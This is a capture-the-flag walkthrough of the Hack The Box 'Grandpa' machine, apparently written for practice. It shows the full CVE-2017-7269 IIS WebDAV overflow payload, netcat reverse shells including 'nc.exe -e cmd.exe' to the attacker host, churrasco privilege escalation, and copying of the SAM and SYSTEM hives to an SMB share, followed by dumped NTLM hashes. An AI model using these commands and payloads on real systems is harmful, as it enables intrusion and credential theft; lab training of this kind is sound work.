# Grandpa | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.2.85
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 02:24 UTC
Nmap scan report for 10.129.2.85
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Wed, 16 Dec 2020 02:31:43 GMT
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows Server 2003 SP2 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows Server 2003 (85%), Microsoft Windows XP SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.54 ms 10.10.14.1
2   223.60 ms 10.129.2.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.99 seconds
```
The machine is running a Microsoft IIS 6.0 web server.

### 2. Check out IIS
The web server homepage is an IIS "Under Construction" page. Similar to the other machine "Granny", PROPFIND is a publically-available method, meaning I can re-attempt the same exploit I used in the other machine.

### 3. Get a shell
Like last time, retrieve the exploit code, set up a netcat listener and then execute.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ python exploit.py 10.129.2.85 80 10.10.14.162 9999
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
Catch the shell in my listener.
```shell
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.2.85] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
nt authority\network service
```

### 4. Enumeration
Since this machine is similar to Grandma I follow the same pattern of enumeration, first verifying the OS and available privileges.
```shell
c:\windows\system32\inetsrv>systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-297-2947634-44968
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 34 Minutes, 35 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 800 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,335 MB
Page File: In Use:         135 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```
To try and see if there is any small differences in this output I can diff the sysinfo between this and the ganny machine. There does not appear to be any major difference.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ diff grannyinfo grandpainfo 
1c1
< Host Name:                 GRANNY
---
> Host Name:                 GRANPA
9c9
< Product ID:                69712-296-0024942-44782
---
> Product ID:                69712-297-2947634-44968
11c11
< System Up Time:            0 Days, 0 Hours, 6 Minutes, 9 Seconds
---
> System Up Time:            0 Days, 0 Hours, 34 Minutes, 35 Seconds
16c16
<                            [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1998 Mhz
---
>                            [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
25c25
< Available Physical Memory: 804 MB
---
> Available Physical Memory: 800 MB
27,28c27,28
< Page File: Available:      2,338 MB
< Page File: In Use:         132 MB
---
> Page File: Available:      2,335 MB
> Page File: In Use:         135 MB
```
Given what I have learnt so far I will re-attempt the local privilege escalation exploit from Granny to obtain a SYSTEM shell.

### 5. Get a SYSTEM shell
Start up SMB server:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[/usr/share/doc/python3-impacket/examples]
└──╼ [★]$ sudo python3 smbserver.py jack /home/htb-jib1337/share/
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
In this shared folder I download nc and the compiled exploit, sourced online.
Copy them onto the machine from my windows shell:
```shell
C:\WINDOWS\Temp>copy \\10.10.14.162\jack\nc.exe .
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.162\jack\churrasco.exe .
        1 file(s) copied.

C:\WINDOWS\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\WINDOWS\Temp

12/16/2020  05:15 AM    <DIR>          .
12/16/2020  05:15 AM    <DIR>          ..
12/16/2020  05:09 AM            31,232 churrasco.exe
12/16/2020  05:06 AM            28,160 nc.exe
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:19 PM    <DIR>          vmware-SYSTEM
12/16/2020  04:25 AM            23,232 vmware-vmsvc.log
10/07/2020  12:52 PM             4,588 vmware-vmusr.log
12/16/2020  04:29 AM               637 vmware-vmvss.log
               6 File(s)        110,601 bytes
               3 Dir(s)  18,096,316,416 bytes free
```
Start the listener and then run the exploit.
```shell
C:\WINDOWS\Temp>churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.162 9998"
churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.162 9998"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 684 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 700 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
Recieve the connection.
```shell
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/share]
└──╼ [★]$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.2.85] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```
### 6. Post-Exploitation
Extract registry hives:
```shell
C:\WINDOWS\Temp>reg save hklm\SAM C:\SAM
The operation completed successfully.

C:\WINDOWS\Temp>reg save hklm\SYSTEM C:\SYSTEM
The operation completed successfully.

C:\WINDOWS\Temp>copy C:\SYSTEM \\10.10.14.162\jack\
        1 file(s) copied.

C:\WINDOWS\Temp>copy C:\SAM \\10.10.14.162\jack\
        1 file(s) copied.

C:\WINDOWS\Temp>del C:\SAM

C:\WINDOWS\Temp>del C:\SYSTEM
```
Extract hashes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/share]
└──╼ [★]$ gosecretsdump -sam SAM -system SYSTEM
gosecretsdump v0.3.0 (@C__Sto)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1d431058310e11523c769a02c751095c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:f967af4a74f97173dac6c2db07995e8b:::
IUSR_GRANPA:1003:aad3b435b51404eeaad3b435b51404ee:6dd9504cc40b03d61a206a39ba71e5f9:::
IWAM_GRANPA:1004:aad3b435b51404eeaad3b435b51404ee:b2e977b90e060f84c3a48c2ffce14588:::
ASPNET:1007:aad3b435b51404eeaad3b435b51404ee:d8037310f08c776fedb491d7b89ede9c:::
Harry:1008:aad3b435b51404eeaad3b435b51404ee:db91f89b1ae367946e72dc60cd020ba4:::
```
